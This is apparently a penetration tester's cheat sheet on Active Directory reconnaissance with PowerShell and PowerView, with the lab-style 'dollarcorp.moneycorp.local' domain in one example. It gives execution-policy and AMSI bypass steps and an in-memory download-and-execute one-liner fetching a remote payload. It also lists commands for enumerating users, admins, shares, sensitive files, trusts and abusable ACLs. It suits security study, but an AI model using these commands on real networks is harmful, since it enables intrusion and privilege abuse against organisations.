Some Basic Things to know :

1. If you hear AD don't think of it as a Domain, think of it as a forest as Microsoft considers that as a Security Boundary and normally if everything works as its intended if a person compromises a domain in a forest its ideally assumed that the other forests are also compromised.
2. DNS causes a lot of issues in AD.
3. Active Directory handles Accessibility, Manageability and Interoperability's of things inside a corporations.

Now Cheat Sheets for PowerShell / PowerView AD Module.

```PowerShell
# To get full help about a certain cmdlet
Get-Help <PowershellCommand> -Full
# To get get examples of how to use the cmdlet
Get-Help <PowershellCommand> -Examples
# To get all the cmdlets
Get-Command -CommandType cmdlet
# To bypass Execution Policy
powershell -ExecutionPolicy bypass
powershell -ep bypass
# To Import a Module
Import-Module <path to the module>
# Download and execute stuff from Memory
iex (New-Object Net.WebClient).DownloadString('https://url/payload')
$wr = [System.Net.WebRequest]::Create("url")
$r = $wr.GetResponse()
```


So most of the times when we wanna try to run stuff like powerview, and so on it wont really work for us due to AMSI. So we have to basically bypasss AMSI before executing our ennumeration tools/ scripts.

After we have done that lets try to ennumerate with PowerView here is github repo to install it :

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

and then we can just transfer this file to the Windows Machine and then open powershell bypass AMSI and then import PowerView.ps1

Here is a Small Cheatsheet to Get Information via Powerview

```PowerShell
# Get Domain Information
Get-NetDomain 
Get-NetDomain -Domain ACME.Local #Get Info about a Particular Domain
# To Get Domain Policies 
Get-DomainPolicy 
# To get users in the current domain
Get-NetUser 
Get-NetUser -Filter Username # Get informaton about specific user
# Get Properties of allusers in current domain
Get-UserProperty
# To Get Group in the Domain
Get-NetGroup 
Get-NetGroup -Domain <domain> # To get group info about specific domain
Get-NetGroup -FullData # To get all data about Groups
Get-NetGroup *somethingyouwannasearch* # To get info about specific group name
# List of Computers in current domain
Get-NetComputer 
Get-NetComputer -FullData # Get all the data 
# Get Members of a Group
Get-NetGroupMember -GroupName "NameofGroup" 
# Get Membership of a Group of a user
Get-NetGroup -Username "username"
# Get local groups on a machine
Get-NetLocalGroup -ComputerName "computername" -ListGroups
# Get Logged users on a computer 
Get-NetLoggedon -Computer <Computer>
# Shares on hosts 
Invoke-ShareFinder -Verbose
#Find sensitive files on computers in the domain
Invoke-FileFinder -Verbose 
# Get all fileservers of the domain
Get-NetFileServer
# List of GPO in this domain
Get-NetGPO 
Get-NetGPO -Computer <computer> # For a specific computer
Get-NetGPOGroup
# Get OU's in a domain 
Get-NetOU -FullData 
# Get GPO's on a OU
Get-NetGPO -GPOname "<GPO from gplink attribute from Get-NetOU>"
# Get ACLs wiht an object 
Get-ObjectAcl -SamAccountName username/objectname -ResolveGUIDs
# Get the ACLs associated with the specified LDAP path to be used for search
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN\=Users,DC=dollarcorp,DC\=moneycorp,DC\=local" -ResolveGUIDs Verbose
# Searhc Intresting ACL 
Invoke-ACLScanner -ResolveGUIDs
# Get All Domain Trusts 
Get-NetDomainTrust
# Info about Forest
Get-NetForest
# All Domains in Forest
Get-NetForestDomain
Get-NetForestCatalog # GC for global catalogs
```

Methadology : 
Ennumerate Users, Computers, Domain Administrators, Eneterprise Admins, Shares and see if you can get any sensitvie information and then map the domain and draw it down and then map their trusts and then use ACL Scanners to see if you have any intresting ACLs that you can abuse.